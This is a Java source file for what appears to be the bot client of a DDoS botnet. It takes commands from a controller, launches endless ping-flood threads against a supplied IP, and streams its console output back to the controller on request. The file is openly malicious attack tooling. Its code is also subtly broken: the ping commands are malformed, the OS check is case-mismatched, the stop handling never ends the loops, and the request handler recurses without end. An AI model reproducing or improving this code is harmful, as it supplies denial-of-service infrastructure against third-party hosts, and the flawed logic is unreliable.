package org.ddos.zombie;

import java.io.IOException;
import java.io.Serializable;
import java.net.SocketAddress;
import java.util.ArrayList;

import org.ddos.network.ZombieNetwork;
import org.jnetwork.DataPackage;

public class RequestHandler {
	private static ArrayList<Thread> ddosers = new ArrayList<>();
	private static boolean sendOutput = false;
	private static SocketAddress address;

	public static void handleRequest() throws ClassNotFoundException, IOException {
		final DataPackage pkgIn = (DataPackage) ZombieNetwork.getClient().getInputStream().readObject();

		println("Packet recieved: " + pkgIn.getMessage());

		if (pkgIn.getMessage().equals("START_DDOS")) {
			println("Starting DDoS on " + pkgIn.getObjects()[0] + " with packet size " + pkgIn.getObjects()[1] + " and "
					+ pkgIn.getObjects()[2] + " thread(s).");
			for (int i = 0; i < (int) pkgIn.getObjects()[2]; i++) {
				Thread ddoser = new Thread(new Runnable() {
					@Override
					public void run() {
						String ip = (String) pkgIn.getObjects()[0];

						while (true) {
							try {
								if (System.getProperty("os.name").contains("windows")) {
									Process p = Runtime.getRuntime()
											.exec("ping -l " + pkgIn.getObjects()[1] + " -n 1" + ip);
									p.waitFor();
								} else {
									Process p = Runtime.getRuntime()
											.exec("ping -s " + pkgIn.getObjects()[1] + " -c 1" + ip);
									p.waitFor();
								}
							} catch (InterruptedException e) {
								try {
									println("Exiting DDoS thread.");
								} catch (IOException e1) {
									// never!
								}
							} catch (IOException e) {
								e.printStackTrace();
							}
						}
					}
				});
				ddoser.start();
				ddosers.add(ddoser);
			}
		} else if (pkgIn.getMessage().equals("STOP_DDOS")) {
			println("Stopping DDoS.");
			for (Thread ddoser : ddosers) {
				ddoser.interrupt();
			}
			ddosers.clear();
		} else if (pkgIn.getMessage().equals("START_READ_ZOMBIE")) {
			sendOutput = true;
			address = (SocketAddress) pkgIn.getObjects()[0];
		} else if (pkgIn.getMessage().equals("STOP_READ_ZOMBIE")) {
			sendOutput = false;
			address = null;
		}

		handleRequest();
	}

	private static void println(Serializable o) throws IOException {
		System.out.println(o);

		if (sendOutput) {
			ZombieNetwork.getClient().getOutputStream()
					.writeObject(new DataPackage(address, o).setMessage("CONSOLE_UPDATE"));
		}
	}

}